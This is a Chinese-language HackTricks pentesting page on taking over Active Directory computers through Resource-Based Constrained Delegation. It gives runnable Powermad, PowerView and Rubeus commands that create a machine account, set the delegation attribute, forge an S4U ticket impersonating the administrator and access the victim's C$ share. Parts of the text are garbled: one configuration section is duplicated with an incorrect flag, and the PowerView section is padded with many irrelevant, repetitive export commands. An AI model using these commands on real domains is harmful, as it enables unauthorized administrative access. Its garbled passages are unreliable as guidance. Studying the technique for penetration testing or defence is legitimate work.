# 基于资源的受限委派

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 基于资源的受限委派基础知识

这与基本的[受限委派](constrained-delegation.md)类似，但**不是将权限授予对象以模拟对服务的任何用户进行身份验证**，而是在**对象中设置谁能够模拟对其进行身份验证的任何用户**。

在这种情况下，受限对象将具有一个名为_**msDS-AllowedToActOnBehalfOfOtherIdentity**_的属性，其中包含可以模拟对其进行身份验证的其他用户的名称。

与其他委派方式相比，这种受限委派的另一个重要区别是，任何具有对计算机帐户的写权限（_GenericAll/GenericWrite/WriteDacl/WriteProperty等）的用户都可以设置_**msDS-AllowedToActOnBehalfOfOtherIdentity**_（在其他委派形式中，您需要域管理员权限）。

### 新概念

在受限委派中，曾经说过，需要在用户的_userAccountControl_值中的**`TrustedToAuthForDelegation`**标志来执行**S4U2Self**。但这并不完全正确。
事实上，即使没有该值，如果您是一个**服务**（具有SPN），您也可以对任何用户执行**S4U2Self**。但是，如果您具有**`TrustedToAuthForDelegation`**标志，返回的TGS将是**可转发的**，如果您没有该标志，返回的TGS将**不可转发**。

然而，如果在**S4U2Proxy**中使用的**TGS**是**不可转发的**，尝试滥用**基本的受限委派**将**不起作用**。但是，如果您试图利用**基于资源的受限委派**，它将起作用（这不是一个漏洞，而是一个功能，显然）。

### 攻击结构

> 如果您对**计算机**帐户具有**等效的写权限**，则可以在该计算机上获得**特权访问**。

假设攻击者已经对受害者计算机具有**等效的写权限**。

1. 攻击者**入侵**一个具有**SPN**的帐户或**创建一个**（“Service A”）。请注意，**任何**_管理员用户_都可以**创建**多达10个**计算机对象（**_**MachineAccountQuota**_**）**并为它们设置SPN。因此，攻击者可以只需创建一个计算机对象并设置SPN。
2. 攻击者滥用其对受害者计算机（ServiceB）的**写权限**，配置**基于资源的受限委派以允许ServiceA模拟对该受害者计算机（ServiceB）的任何用户**。
3. 攻击者使用Rubeus执行**完整的S4U攻击**（S4U2Self和S4U2Proxy），从Service A到Service B为具有对Service B的特权访问的用户。
1. S4U2Self（来自被入侵/创建的帐户的SPN）：请求一个**Administrator到我**的TGS（不可转发）。
2. S4U2Proxy：使用前一步的**不可转发TGS**，请求一个**Administrator到受害主机**的TGS。
3. 即使您使用的是不可转发的TGS，由于您正在利用基于资源的受限委派，它也会起作用。
4. 攻击者可以**传递票据**并**模拟**该用户以获得对受害者ServiceB的**访问权限**。

要检查域的_**MachineAccountQuota**_，您可以使用：
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻击

### 创建计算机对象

您可以使用[powermad](https://github.com/Kevin-Robertson/Powermad)在域内创建计算机对象**：**
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../.gitbook/assets/b1.png)
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### 配置基于资源的受限委派

**使用activedirectory PowerShell模块**

```powershell
# Retrieve the target computer object
$targetComputer = Get-ADComputer -Identity <target_computer>

# Enable Resource-based Constrained Delegation
Set-ADComputer -Identity $targetComputer -PrincipalsAllowedToDelegateToAccount <delegated_account> -TrustedForDelegation $true
```

### 配置基于资源的受限委派

**使用activedirectory PowerShell模块**

```powershell
# 检索目标计算机对象
$targetComputer = Get-ADComputer -Identity <target_computer>

# 启用基于资源的受限委派
Set-ADComputer -Identity $targetComputer -PrincipalsAllowedToDelegateToAccount <delegated_account> -TrustedForDelegation $true
```
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**使用powerview**

```plaintext
Get-DomainUser -TrustedToAuth
```

此命令将返回所有受信任进行身份验证的域用户。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | fl
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并以完整格式显示。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | ft -AutoSize
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并自动调整列宽。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | Export-Csv -Path C:\path\to\file.csv
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并将结果导出到指定路径的CSV文件中。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | ConvertTo-Json
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并将结果转换为JSON格式。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | Out-GridView
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并在可视化窗口中显示结果。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | Export-Csv -Path C:\path\to\file.csv -NoTypeInformation
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并将结果导出到指定路径的CSV文件中，不包含类型信息。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | ConvertTo-Json | Out-File -FilePath C:\path\to\file.json
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并将结果转换为JSON格式，然后将结果保存到指定路径的JSON文件中。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | Export-Csv -Path C:\path\to\file.csv -NoTypeInformation -Encoding UTF8
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并将结果导出到指定路径的CSV文件中，不包含类型信息，并使用UTF-8编码。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | ConvertTo-Json | Out-File -FilePath C:\path\to\file.json -Encoding UTF8
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并将结果转换为JSON格式，然后将结果保存到指定路径的JSON文件中，并使用UTF-8编码。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | Export-Csv -Path C:\path\to\file.csv -NoTypeInformation -Encoding UTF8 -Delimiter ";"
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并将结果导出到指定路径的CSV文件中，不包含类型信息，并使用UTF-8编码和分号作为分隔符。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | ConvertTo-Json | Out-File -FilePath C:\path\to\file.json -Encoding UTF8 -NoClobber
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并将结果转换为JSON格式，然后将结果保存到指定路径的JSON文件中，并使用UTF-8编码，如果文件已存在，则不覆盖。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | Export-Csv -Path C:\path\to\file.csv -NoTypeInformation -Encoding UTF8 -Delimiter ";" -Append
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并将结果追加到指定路径的CSV文件中，不包含类型信息，并使用UTF-8编码和分号作为分隔符。

```plaintext
Get-DomainUser -TrustedToAuth | select samaccountname,memberof | ConvertTo-Json | Out-File -FilePath C:\path\to\file.json -Encoding UTF8 -NoClobber -Append
```

此命令将返回所有受信任进行身份验证的域用户的samaccountname和memberof属性，并将结果转换为JSON格式，然后将结果追加到指定路径的JSON文件中，并使用UTF-8编码，如果文件已存在，则不覆盖。
```
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 执行完整的S4U攻击

首先，我们创建了一个新的计算机对象，密码为`123456`，因此我们需要该密码的哈希值：
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
这将打印该帐户的RC4和AES哈希值。\
现在，可以执行攻击：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
您可以使用Rubeus的`/altservice`参数仅请求一次即可生成更多的票据：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
请注意，用户有一个名为“**不能委派**”的属性。如果用户的此属性为True，则无法冒充他。此属性可以在BloodHound中查看。
{% endhint %}

![](../../.gitbook/assets/B3.png)

### 访问

最后一条命令将执行**完整的S4U攻击，并将TGS注入到内存中**，从管理员到受害主机。\
在此示例中，请求了管理员的**CIFS**服务的TGS，因此您将能够访问**C$**：
```bash
ls \\victim.domain.local\C$
```
![](../../.gitbook/assets/b4.png)

### 滥用不同的服务票据

了解[**可用的服务票据**](silver-ticket.md#available-services)。

## Kerberos错误

* **`KDC_ERR_ETYPE_NOTSUPP`**：这意味着Kerberos配置为不使用DES或RC4，而您只提供了RC4哈希。在Rubeus中至少提供AES256哈希（或只提供rc4、aes128和aes256哈希）。示例：`[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**：这意味着当前计算机的时间与DC的时间不同，Kerberos无法正常工作。
* **`preauth_failed`**：这意味着给定的用户名+哈希无法用于登录。在生成哈希时，您可能忘记在用户名中加入"$"（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
* **`KDC_ERR_BADOPTION`**：这可能意味着：
* 您尝试模拟的用户无法访问所需的服务（因为您无法模拟它或者它没有足够的权限）
* 所请求的服务不存在（如果您请求的是winrm的票据，但winrm未运行）
* 创建的fakecomputer在易受攻击的服务器上失去了特权，您需要将其还原。

## 参考资料

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
